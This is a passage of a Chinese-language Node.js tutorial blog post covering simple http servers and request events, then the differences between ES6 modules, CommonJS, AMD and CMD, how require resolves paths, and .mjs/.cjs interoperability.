    // &#x89E3;&#x51B3;&#x4E2D;&#x6587;&#x4E71;&#x7801;&#x95EE;&#x9898; =&gt; &#x8BBE;&#x7F6E; Content-Type =&gt; {&apos;Content-Type&apos;: &apos;text/html; charset=utf-8&apos;}
    res.writeHead(200, { &apos;Content-Type&apos;: &apos;text/html; charset=utf-8&apos; });
    console.log(&quot;ok&quot;)
    var ipAddress,headers = req.headers,forwardedIpsStr = headers[&apos;x-real-ip&apos;] || headers[&apos;x-forwarded-for&apos;];
    forwardedIpsStr ? ipAddress = forwardedIpsStr : ipAddress = null;
    if (!ipAddress) { ipAddress = req.socket.remoteAddress; }
    console.log(ipAddress)
}).listen(port,()=&gt;{ // &#x8C03;&#x7528;&#x670D;&#x52A1;&#x5668;&#x7684; server.listen(&#x7AEF;&#x53E3;&#x53F7;,cb&#x56DE;&#x8C03;) &#x65B9;&#x6CD5;&#x5373;&#x53EF;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x5668; -&gt; &#x670D;&#x52A1;&#x5668;&#x542F;&#x52A8;&#x6210;&#x529F;&#x5C31;&#x4F1A;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x56DE;&#x8C03;&#x51FD;&#x6570;
    console.log(`http server running at http://127.0.0.1:${port}`)
})

/* &#x670D;&#x52A1;&#x5668;&#x5B9E;&#x4F8B;&#x7684; on() &#x65B9;&#x6CD5;&#x4E3A;&#x670D;&#x52A1;&#x5668;&#x7ED1;&#x5B9A;&#x4E00;&#x4E2A;&#x4E8B;&#x4EF6; =&gt; listening&#x3001;connection&#x3001;close... */
server.on(&apos;listening&apos;,(req,res)=&gt;{
    console.log(&quot;server is listening&quot;)
    // server.close(); // &#x6D4B;&#x8BD5; close &#x4E8B;&#x4EF6;
})
server.on(&apos;connection&apos;,(req,res)=&gt;{
    console.log(&quot;Client is connected&quot;)
})
// req &#x8BF7;&#x6C42;&#x5BF9;&#x8C61;&#x5305;&#x542B;&#x4E86;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x76F8;&#x5173;&#x7684;&#x6570;&#x636E;&#x548C;&#x5C5E;&#x6027;(&#x4E0D;&#x80FD;&#x5199;request)
server.on(&apos;request&apos;,(req,res)=&gt;{ // &#x53EA;&#x8981;&#x6709;&#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;&#x5C31;&#x4F1A;&#x89E6;&#x53D1; request &#x4E8B;&#x4EF6;
    const remoteAddress = res.socket.remoteAddress;
    const localAddress = req.socket.localAddress;
    const port = res.socket.remotePort;
    const str = `your request url is ${req.url}, and request method is ${req.method}, and remoteAddress is ${remoteAddress} and your source port is ${port} and your localAddress is ${localAddress}.`
    // request &#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x5BA2;&#x6237;&#x7AEF;&#x76F8;&#x5173;&#x7684;&#x6570;&#x636E;&#x6216;&#x5C5E;&#x6027; =&gt; res.end() -&gt; &#x53D1;&#x9001;&#x6307;&#x5B9A;&#x5185;&#x5BB9;&#x5E76;&#x7ED3;&#x675F;&#x8BF7;&#x6C42;&#x8FC7;&#x7A0B;
    res.end(str)
})
server.on(&apos;close&apos;,function(){console.log(&quot;Node server is closed&quot;)})
</code></pre>
<ul>
<li>&#x5904;&#x7406; chunk &#x7684; server</li>
</ul>
<pre><code class="language-javascript">const http = require(&apos;http&apos;);
const port = 8089;
http.createServer((req,res)=&gt;{
    let data = &apos;&apos;;
    req.on(&quot;data&quot;,(chunk)=&gt;{data += chunk});
    req.on(&quot;end&quot;,function(){
        let method = req.method,headers = JSON.stringify(req.headers),httpVersion = req.httpVersion,requestUrl = req.url;
        res.writeHead(200,{&quot;content-type&quot;:&quot;text/plain;charset=utf-8&quot;})
        let responseData = method + &apos;-&apos; + headers + &apos;-&apos; + httpVersion + &apos;-&apos; + requestUrl;
        res.end(responseData);
    })
}).listen(port,()=&gt;{console.log(`server is running at http://127.0.0.1:${port}`)})
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E6%A8%A1%E5%9D%97%E5%8C%96">&#x6A21;&#x5757;&#x5316;</h2>
<ul>
<li>&#x6A21;&#x5757;&#x7684;&#x5BFC;&#x5165;&#x4E0E;&#x5BFC;&#x51FA;</li>
</ul>
<p>NodeJS &#x4E13;&#x7528;&#x7684; CommonJS &#x6A21;&#x5757;&#xFF08;CJS&#xFF09;&#x4E0D;&#x540C;&#x4E8E; ES6 &#x6A21;&#x5757; (ESM)&#x3002;&#x5728; ES6 &#x4E2D; export &#x4E0E; export default &#x5747;&#x53EF;&#x7528;&#x4E8E;&#x5BFC;&#x51FA;&#x6A21;&#x5757;&#xFF0C;&#x5E76;&#x5728;&#x9700;&#x8981;&#x7684;&#x6587;&#x4EF6;&#x6216;&#x6A21;&#x5757;&#x4E2D;&#x901A;&#x8FC7; &quot;import from &#x6A21;&#x5757;&#x540D;&quot; &#x7684;&#x65B9;&#x5F0F;&#x5C06;&#x5176;&#x5BFC;&#x5165;&#x3002;&#x5728; ES6 &#x4E2D;&#x901A;&#x8FC7; export &#x65B9;&#x5F0F;&#x5BFC;&#x51FA;&#xFF0C;&#x5C31;&#x8981;&#x5728;&#x5BFC;&#x5165;&#x65F6;&#x8981;&#x52A0;&#x4E0A; {}&#xFF0C;&#x800C; export default &#x5219;&#x4E0D;&#x9700;&#x8981;&#xFF0C;&#x76F4;&#x63A5;&#x5BFC;&#x5165;&#x5373;&#x53EF;&#xFF0C;&#x4E14;&#x9ED8;&#x8BA4;&#x8F93;&#x51FA;&#x7684;&#x5BFC;&#x5165;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x77E5;&#x9053;&#x6240;&#x8981;&#x52A0;&#x8F7D;&#x6A21;&#x5757;&#x7684;&#x53D8;&#x91CF;&#x540D;&#x3002;&#x56E0;&#x4E3A;&#x5728;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x6216;&#x6A21;&#x5757;&#x4E2D;&#xFF0C;export&#x3001;import &#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;&#xFF0C;&#x800C; export default &#x4EC5;&#x6709;&#x4E00;&#x4E2A;&#x3002;</p>
<pre><code class="language-js">// ES6 &#x2014;&#x2014; export
// a.js
export const str = &quot;zairesinatra&quot;;
export function zs (sth) { 
  return sth;
}
// &#x5BF9;&#x5E94;&#x7684;&#x5BFC;&#x5165;&#x65B9;&#x5F0F;&#xFF1A;
// b.js
import { str, zs } from &apos;a&apos;; // &#x4E5F;&#x53EF;&#x4EE5;&#x5206;&#x5F00;&#x5199;&#x4E24;&#x6B21;&#xFF0C;&#x5BFC;&#x5165;&#x7684;&#x65F6;&#x5019;&#x5E26;&#x82B1;&#x62EC;&#x53F7;

// ES6 &#x2014;&#x2014; export default
// a.js
const str = &quot;zairesinatra&quot;;
export default str;
// &#x5BF9;&#x5E94;&#x7684;&#x5BFC;&#x5165;&#x65B9;&#x5F0F;&#xFF1A;
//b.js
import str from &apos;a&apos;; //&#x5BFC;&#x5165;&#x7684;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x82B1;&#x62EC;&#x53F7;

// ES6 &#x2014;&#x2014; &#x81EA;&#x7531;&#x547D;&#x540D;
// a.js
let name = &quot;xzy&quot;;
export default name // name&#x4E0D;&#x80FD;&#x52A0;&#x5927;&#x62EC;&#x53F7;
// &#x539F;&#x672C;&#x76F4;&#x63A5;export name&#x5916;&#x90E8;&#x662F;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x7684;&#xFF0C;&#x52A0;&#x4E0A;default&#x5C31;&#x53EF;&#x4EE5;&#x4E86;.&#x4F46;&#x662F;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5185;&#x6700;&#x591A;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;export default&#x3002;
// &#x5176;&#x5B9E;&#x6B64;&#x5904;&#x76F8;&#x5F53;&#x4E8E;&#x4E3A;name&#x53D8;&#x91CF;&#x503C;&quot;xzy&quot;&#x8D77;&#x4E86;&#x4E00;&#x4E2A;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x7684;&#x53D8;&#x91CF;&#x540D;default&#xFF0C;&#x81EA;&#x7136;default&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5185;&#x4E0D;&#x80FD;&#x6709;&#x591A;&#x4E2A;export default&#x3002;
// b.js
// &#x672C;&#x8D28;&#x4E0A;&#xFF0C;a.js&#x6587;&#x4EF6;&#x7684;export default&#x8F93;&#x51FA;&#x4E00;&#x4E2A;&#x53EB;&#x505A;default&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x7136;&#x540E;&#x7CFB;&#x7EDF;&#x5141;&#x8BB8;&#x4F60;&#x4E3A;&#x5B83;&#x53D6;&#x4EFB;&#x610F;&#x540D;&#x5B57;&#x3002;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x4E3A;import&#x7684;&#x6A21;&#x5757;&#x8D77;&#x4EFB;&#x4F55;&#x53D8;&#x91CF;&#x540D;&#xFF0C;&#x4E14;&#x4E0D;&#x9700;&#x8981;&#x7528;&#x5927;&#x62EC;&#x53F7;&#x5305;&#x542B;
import zs from &quot;./a.js&quot;
import zy from &quot;./a.js&quot; 
console.log(zs,zy)   // xzy,xzy
</code></pre>
<p>&#x5728; CommonJS &#x4E2D;&#xFF0C;<strong>&#x4F7F;&#x7528; require &#x5F15;&#x5165;&#x540E;&#x8FD4;&#x56DE;&#x7684;&#x53EA;&#x6709; module.exports &#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;</strong>&#x3002;&#x800C;&#x5728;&#x7F16;&#x5199;&#x6A21;&#x5757;&#x65F6;&#x7528;&#x5230;&#x7684; exports &#x5BF9;&#x8C61;&#x5B9E;&#x9645;&#x4E0A;&#x53EA;&#x662F;&#x5BF9; module.exports &#x7684;&#x5F15;&#x7528;&#x3002;module.exports &#x521D;&#x59CB;&#x503C;&#x4E3A;&#x4E00;&#x4E2A;&#x7A7A;&#x5BF9;&#x8C61; {}&#x3002;<a href="https://stackoverflow.com/questions/7137397/module-exports-vs-exports-in-node-js/7142924">SOF &#x70B9;&#x6B64;</a>&#x3002;</p>
<pre><code class="language-javascript">// &#x533A;&#x5206; exports &#x4E0E; module.exports
// &#x5982;&#x679C;&#x8986;&#x76D6; exports &#x7684;&#x503C;,&#x90A3;&#x4E48;&#x5C06;&#x4E22;&#x5931;&#x5BF9; module.exports &#x7684;&#x5F15;&#x7528;,&#x800C; module.exports &#x5C31;&#x662F;&#x4F5C;&#x4E3A;&#x516C;&#x5171;&#x63A5;&#x53E3;&#x516C;&#x5F00;&#x7684;&#x5185;&#x5BB9;
var module = new Module(...);
var exports = module.exports;
</code></pre>
<pre><code class="language-javascript">// CommonJS &#x2014;&#x2014; &#x5BFC;&#x51FA;&#x5355;&#x4E2A;&#x6A21;&#x5757;
// formatTime
function formatTime (){
    // &#x9700;&#x8981;&#x7684;&#x683C;&#x5F0F; yyyy-MM-dd hh:mm:ss
    var date = new Date(); // &#x6216;&#x8005;&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x6233;
    Y = date.getFullYear() + &apos;-&apos;;
    M = (date.getMonth()+1 &lt; 10 ? &apos;0&apos;+(date.getMonth()+1) : date.getMonth()+1) + &apos;-&apos;;
    D = date.getDate() + &apos; &apos;;
    h = date.getHours() + &apos;:&apos;;
    m = date.getMinutes() + &apos;:&apos;;
    s = date.getSeconds(); 
    console.log(Y+M+D+h+m+s); // &#x5F53;&#x524D;&#x65F6;&#x95F4;&#x683C;&#x5F0F;&#x5316;&#x8F93;&#x51FA;
}
module.exports = formatTime
// requireFT
var requireFT = require(&apos;./formatTime&apos;) // &#x5F53;&#x7136; .js &#x53EF;&#x4EE5;&#x7701;&#x7565;
requireFT() // 2019-08-29 20:33:48

// CommonJS &#x2014;&#x2014; &#x5BFC;&#x51FA;&#x591A;&#x4E2A;&#x6A21;&#x5757;
// func.js
var func1 = () =&gt;{console.log(&apos;I am func1&apos;)}
var func2 = function(){console.log(&apos;I am func2&apos;)}
module.exports.func1 = func1;
module.exports.func2 = func2;
// &#x53EF;&#x7B80;&#x5199;
module.exports = { // &#x952E;&#x503C;&#x540C;&#x540D;&#x53EF;&#x4EE5;&#x53EA;&#x5199;&#x4E00;&#x4E2A;
    func1: func1, // func1,
    func2: func2 // func2
}

// requireFunc.js
var requireObj = require(&apos;./formatTime&apos;)
requireObj.func1(); // I am func1
requireObj.func2(); // I am func2
</code></pre>
<pre><code class="language-javascript">// mod1.js
let name = &quot;zs&quot;; // &#x5B57;&#x7B26;&#x4E32;&#x662F;&#x503C;&#x5F15;&#x7528;,&#x5DF2;&#x7ECF;&#x6307;&#x5B9A;&#x4E86;&#x5730;&#x5740;
setTimeout(() =&gt; {
  name = &quot;zszszs&quot;
}, 1000)
module.exports = {
  name: name
}
// exec1.js
const mod1 = require(&apos;./mod1&apos;)
setTimeout(() =&gt; {
  console.log(mod1.name); // zs
}, 2000)

// mod2.js
let info = { name: &quot;zs&quot;}; // &#x5F15;&#x7528;&#x5BF9;&#x8C61;&#x5728;&#x5806;&#x5185;&#x5B58;&#x5F00;&#x8F9F;&#x7A7A;&#x95F4;
setTimeout(() =&gt; {
  info.name = &quot;zszszs&quot; // &#x6539;&#x53D8;&#x4E86;&#x6307;&#x9488;
}, 1000)
module.exports = {
  info // info &#x8D4B;&#x503C;&#x7684;&#x662F;&#x5185;&#x5B58;&#x5730;&#x5740;
}
// exec2.js
const mod2 = require(&apos;./mod2&apos;)
setTimeout(() =&gt; {
  console.log(mod2.info.name); // zszszs
}, 2000)
</code></pre>
<ul>
<li>require &#x7EC6;&#x8282;</li>
</ul>
<p>require &#x662F;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x5E2E;&#x52A9;&#x5F15;&#x5165;&#x6587;&#x4EF6;&#x6A21;&#x5757;&#x4E2D;&#x7684;&#x5BFC;&#x51FA;&#x5BF9;&#x8C61;&#xFF0C;&#x5176;&#x8FC7;&#x7A0B;&#x662F;&#x540C;&#x6B65;&#x7684;&#x3002;</p>
<p>require &#x67E5;&#x627E;&#x89C4;&#x5219;&#x4F9D;&#x636E;&#x662F;&#x5426;&#x4E3A;&#x6838;&#x5FC3;&#x6A21;&#x5757;&#xFF0C;&#x76F4;&#x63A5;&#x8FD4;&#x56DE; fs&#x3001;path&#x3001;http... &#x5E76;&#x505C;&#x6B62;&#x67E5;&#x627E;&#x6216;&#x5206;&#x7C7B;&#x8BA8;&#x8BBA;&#x3002;</p>
<p>&#x5982;&#x679C;&#x4EE5; ./ &#x6216; ../ &#x6216; / &#x5F00;&#x5934;&#x7684;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x67E5;&#x627E;&#x3002;&#x6709;&#x540E;&#x7F00;&#x540D;&#x65F6;&#xFF0C;&#x6309;&#x7167;&#x540E;&#x7F00;&#x540D;&#x683C;&#x5F0F;&#x8FDB;&#x884C;&#x67E5;&#x627E;&#xFF0C;&#x6CA1;&#x6709;&#x5219;&#x6309;&#x6587;&#x4EF6;&#x3001;js &#x6587;&#x4EF6;&#x3001;json &#x6587;&#x4EF6;&#x3001;node &#x6587;&#x4EF6;&#x7684;&#x987A;&#x5E8F;&#x67E5;&#x627E;&#x3002;&#x82E5;&#x6CA1;&#x6709;&#x627E;&#x5230;&#xFF0C;&#x5219;&#x6309;&#x76EE;&#x5F55;&#x540D;&#x8FDB;&#x884C;&#x67E5;&#x627E;&#x3002;</p>
<p>&#x76F4;&#x63A5;&#x4EE5;&#x540D;&#x79F0;&#x5F15;&#x5165;&#xFF0C;&#x4E14;&#x975E;&#x6838;&#x5FC3;&#x6A21;&#x5757;&#xFF0C;&#x5219;&#x6309;&#x5C42;&#x7EA7;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x4ECE;&#x6700;&#x8FD1;&#x7684; node_modules &#x6587;&#x4EF6;&#x5939;&#x67E5;&#x627E;&#x5230;&#x6839;&#x76EE;&#x5F55;&#x7684; node_modules &#x6587;&#x4EF6;&#x5939;&#x3002;</p>
<ul>
<li>&#x6A21;&#x5757;&#x7684;&#x52A0;&#x8F7D;&#x8FC7;&#x7A0B;</li>
</ul>
<p>&#x6A21;&#x5757;&#x88AB;&#x7B2C;&#x4E00;&#x6B21;&#x5F15;&#x5165;&#xFF0C;&#x6A21;&#x5757;&#x7684; JS &#x4EE3;&#x7801;&#x88AB;&#x8FD0;&#x884C;&#x4E00;&#x6B21;&#xFF1B;&#x82E5;&#x6A21;&#x5757;&#x88AB;&#x591A;&#x6B21;&#x5F15;&#x5165;&#xFF0C;&#x4E5F;&#x53EA;&#x4F1A;&#x52A0;&#x8F7D;&#x4E00;&#x6B21;&#xFF0C;&#x56E0;&#x4E3A;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;&#x5BF9;&#x8C61; module &#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x5C5E;&#x6027; loaded&#xFF0C;&#x4E3A; false &#x65F6;&#x8868;&#x793A;&#x6CA1;&#x6709;&#x52A0;&#x8F7D;&#xFF0C;true &#x5219;&#x5DF2;&#x52A0;&#x8F7D;&#x5B8C;&#x6210;&#x3002;</p>
<p>&#x5982;&#x51FA;&#x73B0;&#x4E0B;&#x56FE;&#x7684;&#x5FAA;&#x73AF;&#x5F15;&#x5165;&#xFF0C;&#x5219;&#x52A0;&#x8F7D;&#x987A;&#x5E8F;&#x4E3A; main&#x3001;a&#x3001;c&#x3001;d&#x3001;e&#x3001;b&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x56FE;&#x7ED3;&#x6784;&#xFF1B;&#x56FE;&#x7ED3;&#x6784;&#x5728;&#x904D;&#x5386;&#x65F6;&#x6709;&#x6DF1;&#x5EA6;&#x4F18;&#x5148;&#x641C;&#x7D22;&#x548C;&#x5E7F;&#x5EA6;&#x4F18;&#x5148;&#x641C;&#x7D22;&#xFF0C;&#x7136;&#x800C; Node &#x91C7;&#x7528;&#x6DF1;&#x5EA6;&#x4F18;&#x5148;&#x641C;&#x7D22;&#x3002;</p>
<p><img src="yourdomain.com/content/images/2021/11/circlecall.png" alt="NodeJS" loading="lazy"></p>
<ul>
<li>AMD &#x548C; CMD</li>
</ul>
<p>AMD &#x662F; Asynchronous Module Definition &#x79FB;&#x6B65;&#x6A21;&#x5757;&#x5316;&#x7684;&#x7F29;&#x5199;&#xFF0C;&#x91C7;&#x7528;&#x5F02;&#x6B65;&#x52A0;&#x8F7D;&#x6A21;&#x5757;&#x3002;&#x5E38;&#x7528;&#x7684;&#x5E93;&#x662F; require.js &#x548C; curl.js&#x3002;</p>
<pre><code class="language-html">&lt;script src=&quot;./lib/require.js&quot; data-main=&quot;./index.js&quot;&gt;&lt;/script&gt;
</code></pre>
<pre><code class="language-js">// index.js
(function(){
  require.config({
    baseUrl: &apos;&apos;,
    path: {
      &quot;bar&quot;: &quot;./modules/bar&quot;, // &#x5BF9;&#x5E94;&#x6A21;&#x5757;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;
      &quot;foo&quot;: &quot;./modules/foo&quot;
    }
  })
  require([&apos;foo&apos;], function(foo){})
})()
</code></pre>
<pre><code class="language-javascript">// bar.js
define(function() {
  const name = &quot;zszs&quot;;
  const age = 21;
  const sayHello = function(){
    console.log(&quot;hi&quot; + name);
  }
  return {
    name: name,
    age: age,
    sayHello: sayHello
  }
})
</code></pre>
<pre><code class="language-javascript">// foo.js
define([&apos;bar&apos;], function(bar){
  console.log(bar.name);
  console.log(bar.age);
  bar.sayHello(&quot;zy&quot;);
})
</code></pre>
<p>CMD &#x662F; Common Module Definition &#x901A;&#x7528;&#x6A21;&#x5757;&#x5B9A;&#x4E49;&#x7684;&#x7F29;&#x5199;&#xFF0C;&#x4E5F;&#x91C7;&#x7528;&#x5F02;&#x6B65;&#x52A0;&#x8F7D;&#x6A21;&#x5757;&#x3002;&#x5B9E;&#x73B0;&#x65B9;&#x6848;&#x662F; SeaJS&#x3002;</p>
<pre><code class="language-html">&lt;script src=&quot;./lib.sea.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
  seajs.use(&apos;./index.js&apos;)
&lt;/script&gt;
</code></pre>
<pre><code class="language-javascript">// index.js
define(function(require, exports, module){
  const foo = require(&apos;./modules/foo&apos;);
  console.log(foo.name);
  console.log(foo.age)
  console.log(foo.sayHello(&apos;zy&apos;))
})
</code></pre>
<pre><code class="language-javascript">// foo.js
define(function(require, exports, module){
  const name = &quot;zs&quot;;
  const age = 21;
  const sayHello = function(name){
    console.log(&quot;hi&quot; + name);
  }
  module.exports = {
    name,
    age,
    sayHello
  }
})
</code></pre>
<ul>
<li><a href="https://www.ruanyifeng.com/blog/2020/08/how-nodejs-use-es6-module.html">Node.js &#x5982;&#x4F55;&#x5904;&#x7406; ES6 &#x6A21;&#x5757;</a>&#x3002;</li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E6%A8%A1%E5%9D%97%E5%A4%84%E7%90%86">&#x6A21;&#x5757;&#x5904;&#x7406;</h2>
<p>&#x7531;&#x4E8E; ESM &#x6A21;&#x5757;&#x4E0E; CJS &#x6A21;&#x5757;&#x4E92;&#x4E0D;&#x517C;&#x5BB9;&#x3002;require() &#x662F;&#x540C;&#x6B65;&#x52A0;&#x8F7D;&#xFF0C;&#x540E;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x5FC5;&#x987B;&#x7B49;&#x5F85;&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5B8C;&#xFF0C;&#x624D;&#x4F1A;&#x6267;&#x884C;&#x3002;import &#x547D;&#x4EE4;&#x5219;&#x662F;&#x5F02;&#x6B65;&#x52A0;&#x8F7D;&#xFF0C;&#x6216;&#x8005;&#x66F4;&#x51C6;&#x786E;&#x5730;&#x8BF4;&#xFF0C;ES6 &#x6A21;&#x5757;&#x6709;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;&#x9759;&#x6001;&#x89E3;&#x6790;&#x9636;&#x6BB5;&#xFF0C;&#x4F9D;&#x8D56;&#x5173;&#x7CFB;&#x7684;&#x5206;&#x6790;&#x662F;&#x5728;&#x90A3;&#x4E2A;&#x9636;&#x6BB5;&#x5B8C;&#x6210;&#x7684;&#xFF0C;&#x6700;&#x5E95;&#x5C42;&#x7684;&#x6A21;&#x5757;&#x7B2C;&#x4E00;&#x4E2A;&#x6267;&#x884C;&#x3002;</p>
<p>NodeJS &#x8981;&#x6C42; ES6 &#x6A21;&#x5757;&#x91C7;&#x7528; .mjs &#x540E;&#x7F00;&#x6587;&#x4EF6;&#x540D;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x53EA;&#x8981;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x91CC;&#x9762;&#x4F7F;&#x7528; import &#x6216;&#x8005; export &#x547D;&#x4EE4;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x5FC5;&#x987B;&#x91C7;&#x7528; .mjs &#x540E;&#x7F00;&#x540D;&#x3002;NodeJS &#x9047;&#x5230; .mjs &#x6587;&#x4EF6;&#xFF0C;&#x5C31;&#x9ED8;&#x8BA4;&#x4E3A; ES6 &#x6A21;&#x5757;&#xFF0C;&#x540C;&#x65F6;&#x542F;&#x7528;&#x4E25;&#x683C;&#x6A21;&#x5F0F;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x5E0C;&#x671B;&#x5C06;&#x540E;&#x7F00;&#x540D;&#x6539;&#x6210; .mjs&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x9879;&#x76EE;&#x7684; package.json &#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6307;&#x5B9A; type &#x5B57;&#x6BB5;&#x4E3A; module&#x3002;</p>
<pre><code class="language-json">{ &quot;type&quot;: &quot;module&quot; }
</code></pre>
<p>&#x5982;&#x679C;&#x6B64;&#x65F6;&#x8FD8;&#x8981;&#x4F7F;&#x7528; CommonJS &#x6A21;&#x5757;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x5C06; CommonJS &#x811A;&#x672C;&#x7684;&#x540E;&#x7F00;&#x540D;&#x90FD;&#x6539;&#x6210;<code>.cjs</code>&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709; type &#x5B57;&#x6BB5;&#xFF0C;&#x6216;&#x8005; type &#x5B57;&#x6BB5;&#x4E3A; commonjs&#xFF0C;&#x5219; .js &#x811A;&#x672C;&#x4F1A;&#x88AB;&#x89E3;&#x91CA;&#x6210; CommonJS &#x6A21;&#x5757;&#x3002;</p>
<p>&#x603B;&#x7ED3;&#x5C31;&#x662F; .mjs &#x6587;&#x4EF6;&#x603B;&#x662F;&#x4EE5; ES6 &#x6A21;&#x5757;&#x52A0;&#x8F7D;&#xFF0C;.cjs &#x6587;&#x4EF6;&#x603B;&#x662F;&#x4EE5; CommonJS &#x6A21;&#x5757;&#x52A0;&#x8F7D;&#xFF0C;.js &#x6587;&#x4EF6;&#x7684;&#x52A0;&#x8F7D;&#x53D6;&#x51B3;&#x4E8E; package.json &#x91CC;&#x7684; type &#x5B57;&#x6BB5;&#x8BBE;&#x7F6E;&#x3002;&#x4F46;&#x662F; ES6 &#x6A21;&#x5757;&#x4E0E; CommonJS &#x6A21;&#x5757;&#x5C3D;&#x91CF;&#x4E0D;&#x8981;&#x6DF7;&#x7528;&#x3002;&#x6DF7;&#x548C;&#x52A0;&#x8F7D;&#x76F8;&#x53CD;&#x540E;&#x7F00;&#x540D;&#x6587;&#x4EF6;&#x4F1A;&#x4EA7;&#x751F;&#x62A5;&#x9519;&#x3002;</p>
<ul>
<li>&#x5168;&#x5C40;&#x6A21;&#x5757;&#x4E0E;&#x6838;&#x5FC3;&#x6A21;&#x5757;</li>
</ul>
<p>&#x5728;&#x9879;&#x76EE;&#x4E2D;&#x53EF;&#x4EE5;&#x968F;&#x65F6;&#x8BBF;&#x95EE;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x5F15;&#x5165;&#x7684;&#x6A21;&#x5757;&#x79F0;&#x4E3A;&#x5168;&#x5C40;&#x6A21;&#x5757;&#xFF08;&#x5305;&#x62EC;&#x5168;&#x5C40;&#x5BF9;&#x8C61;&#x4E0E;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF09;&#x3002;&#x4E0D;&#x9700;&#x8981;&#x5355;&#x72EC;&#x4E0B;&#x8F7D;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5F15;&#x5165; (require&#x7684;&#x53C2;&#x6570;&#x5C31;&#x662F;&#x8DEF;&#x5F84;) &#x7684;&#x6A21;&#x5757;&#x79F0;&#x4E3A;&#x6838;&#x5FC3;&#x6A21;&#x5757; (path&#x3001;fs&#x3001;http)&#x3002;</p>
<ul>
<li>CommonJS &#x6A21;&#x5757;&#x52A0;&#x8F7D; ES6 &#x6A21;&#x5757;</li>
</ul>
<p>CommonJS &#x7684;<code>require()</code>&#x547D;&#x4EE4;&#x4E0D;&#x80FD;&#x52A0;&#x8F7D; ES6 &#x6A21;&#x5757;&#xFF0C;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x53EA;&#x80FD;&#x4F7F;&#x7528;<code>import()</code>&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x52A0;&#x8F7D;&#x3002;</p>
<pre><code class="language-js">// CommonJS&#x6A21;&#x5757;
(async () =&gt; {
  await import(&apos;./my-app.mjs&apos;); // &#x53EF;&#x5728; CommonJS &#x6A21;&#x5757;&#x4E2D;&#x8FD0;&#x884C;
})();
// require() &#x4E0D;&#x652F;&#x6301; ES6 &#x6A21;&#x5757;&#x7684;&#x4E00;&#x4E2A;&#x539F;&#x56E0;&#x662F;&#x5B83;&#x662F;&#x540C;&#x6B65;&#x52A0;&#x8F7D;&#x7684;&#xFF0C;&#x800C; ES6 &#x6A21;&#x5757;&#x5185;&#x90E8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5F02;&#x6B65;&#x7684;&#x547D;&#x4EE4;,&#x5BFC;&#x81F4;&#x65E0;&#x6CD5;&#x88AB;&#x540C;&#x6B65;&#x52A0;&#x8F7D;
</code></pre>
<ul>
<li>ES6 &#x6A21;&#x5757;&#x52A0;&#x8F7D; CommonJS &#x6A21;&#x5757;</li>
</ul>
<p>ES6 &#x6A21;&#x5757;&#x7684; import &#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x52A0;&#x8F7D; CommonJS &#x6A21;&#x5757;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x80FD;&#x6574;&#x4F53;&#x52A0;&#x8F7D;&#xFF0C;&#x4E0D;&#x80FD;&#x53EA;&#x52A0;&#x8F7D;&#x5355;&#x4E00;&#x7684;&#x8F93;&#x51FA;&#x9879;&#x3002;</p>
<pre><code class="language-js">import packageMain from &apos;commonjs-package&apos;; // &#x6B63;&#x786E;
import { method } from &apos;commonjs-package&apos;; // &#x62A5;&#x9519;
